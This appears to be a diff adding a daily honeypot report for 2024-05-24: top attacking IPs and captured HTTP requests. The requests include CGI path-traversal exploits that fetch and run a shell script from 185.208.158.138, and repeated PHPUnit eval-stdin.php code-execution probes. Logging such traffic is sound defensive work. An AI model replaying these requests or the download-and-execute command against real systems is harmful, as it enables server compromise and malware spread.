@@ -1,0 +1,140 @@
+Top 5 IPs for 2024-05-24 :
+
+103.10.55.202
+61.188.178.199
+182.122.226.1
+117.216.20.244
+59.180.176.76
+
+Malware Observed:
+
+None Observed
+
+
+Commands/exploits observed:
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 114
+Content-Type: text/plain
+
+wget http://185.208.158.138/sh -O- | sh -s apache.selfrep || curl http://185.208.158.138/sh | sh -s apache.selfrepPOST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 114
+Content-Type: text/plain
+
+wget http://185.208.158.138/sh -O- | sh -s apache.selfrep || curl http://185.208.158.138/sh | sh -s apache.selfrepGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: HOST
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
